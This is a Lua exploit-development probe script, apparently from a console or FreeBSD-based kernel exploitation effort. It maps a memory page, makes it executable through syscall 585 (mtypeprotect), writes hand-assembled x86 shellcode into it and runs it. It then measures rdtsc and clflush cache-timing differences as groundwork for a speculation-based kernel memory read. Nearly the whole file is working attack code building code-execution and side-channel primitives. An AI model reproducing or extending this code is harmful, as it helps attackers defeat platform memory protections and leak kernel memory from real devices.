-- CRASH_CLASS: MEDIUM (executes its own bytes; a fault takes the loader down)
-- PROBE 1245b: executable pages via mtypeprotect, and the two CPU facilities a
-- speculation-based kernel read needs.
-- 1245a measured: mmap(prot=7) returns a page that is readable and writable but
-- NOT executable (calling it faulted with RIP at the page, CS=0x43).
-- Probe 44a (2026-10-16) measured: mmap(prot=3) + mtypeprotect(585) leaves the
-- page executable (a NOP sled ran), but that probe had no return channel, so the
-- shellcode's own return value could not be observed. native.fcall_with_rax is a
-- real indirect call that returns rax, so it can.
print("=== PROBE 1245b: mtypeprotect exec + rdtsc/clflush ===")
local function N(v) if type(v)=="table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function ES() local ok,s=pcall(function() return get_error_string() end) if ok then return tostring(s) end return "?" end
local function hilo(v) if type(v)=="table" and v.h then return v.h,v.l end return 0,N(v) end
local function wb(a,v) pcall(function() memory.write_byte(a,v) end) end
local function rq(a) local ok,v=pcall(function() return memory.read_qword(a) end) if ok then return N(v) end return -1 end
local function poke(addr, bytes) for i=1,#bytes do wb(addr+i-1, bytes[i]) end end
local function toaddr(v) local h,l=hilo(v) return l + h*4294967296 end

print(string.format("[0] pid=%d", N(mk(20)())))

local page = nil
do
  local ok, v = pcall(function() return mk(477)(uint64(0), uint64(0x4000), uint64(3), uint64(0x1002), uint64(-1), uint64(0)) end)
  if ok then page = toaddr(v) end
end
if not page or page <= 0 then
  print(string.format("[-] mmap prot3 FAILED %s", ES()))
  print("=== DONE ===") return
end
print(string.format("[1] rw page at 0x%X", page))

local CODE = {
  ret1234 = {0xB8,0x34,0x12,0x00,0x00,0xC3},
  rdtsc   = {0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0xC3},
  -- returns the rdtsc delta of one load from [rdi], after clflush
  flushed = {0x0F,0xAE,0x3F,0x0F,0xAE,0xF0,0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x49,0x89,0xC0,0x48,0x8B,0x07,0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x4C,0x29,0xC0,0xC3},
  -- same without the flush
  cached  = {0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x49,0x89,0xC0,0x48,0x8B,0x07,0x0F,0xAE,0xE8,0x0F,0x31,0x48,0xC1,0xE2,0x20,0x48,0x09,0xD0,0x4C,0x29,0xC0,0xC3},
}

poke(page, CODE.ret1234)
local ok, r0 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
print(string.format("[2] before mtypeprotect: call -> ok=%s val=0x%X %s", tostring(ok), ok and N(r0) or 0, ok and "" or tostring(r0)))

print("[3] mtypeprotect(585)")
local ok3, v3 = pcall(function() return mk(585)(uint64(page), uint64(0x4000), uint64(7)) end)
print(string.format("    3-arg (addr,len,7)      -> ok=%s ret=%s err=%s", tostring(ok3), tostring(ok3 and N(v3) or v3), ES()))
local ok4, v4 = pcall(function() return mk(585)(uint64(page), uint64(0x4000), uint64(3), uint64(7)) end)
print(string.format("    4-arg (addr,len,3,7)    -> ok=%s ret=%s err=%s", tostring(ok4), tostring(ok4 and N(v4) or v4), ES()))
local ok5, v5 = pcall(function() return mk(585)(uint64(page), uint64(0x4000), uint64(5)) end)
print(string.format("    3-arg (addr,len,5=rx)   -> ok=%s ret=%s err=%s", tostring(ok5), tostring(ok5 and N(v5) or v5), ES()))

print("[4] execution test through the real indirect call")
poke(page, CODE.ret1234)
local ok6, r6 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
if not ok6 then
  print(string.format("    CALL-FAIL %s", tostring(r6)))
  print("=== DONE (no execution) ===") return
end
print(string.format("    call -> 0x%X (want 0x1234) EXEC=%s", N(r6), tostring(N(r6) == 0x1234)))
if N(r6) ~= 0x1234 then print("=== DONE (unexpected return) ===") return end

print("[5] rdtsc at CPL3")
poke(page, CODE.rdtsc)
local a1, t1 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
local a2, t2 = pcall(function() return native.fcall_with_rax(page, 0,0,0,0,0,0,0) end)
if not (a1 and a2) then print(string.format("    RDTSC-FAIL a1=%s a2=%s", tostring(a1), tostring(a2))) print("=== DONE ===") return end
print(string.format("    tsc 0x%X then 0x%X delta=%d", N(t1), N(t2), N(t2)-N(t1)))

print("[6] cache timing: reload after clflush vs cached (line = the code page itself)")
local probe_line = page + 0x1000
poke(probe_line, {0x41,0x42,0x43,0x44,0x45,0x46,0x47,0x48})
poke(page, CODE.cached)
print(string.format("    cached code at 0x%X", page))
local function trial(entry, tag)
  local vals = {}
  for i=1,8 do
    local okk, vv = pcall(function() return native.fcall_with_rax(entry, 0, probe_line,0,0,0,0,0) end)
    if not okk then print(string.format("    %s FAULT %s", tag, tostring(vv))) return nil end
    vals[#vals+1] = N(vv)
  end
  table.sort(vals)
  print(string.format("    %-8s min=%d med=%d max=%d", tag, vals[1], vals[4], vals[8]))
  return vals
end
local cached_vals = trial(page, "cached")
if cached_vals then
  poke(page, CODE.flushed)
  local flushed_vals = trial(page, "flushed")
  if flushed_vals then
    print(string.format("    signal: flushed_med - cached_med = %d cycles", flushed_vals[4] - cached_vals[4]))
  end
end
print("=== DONE ===")
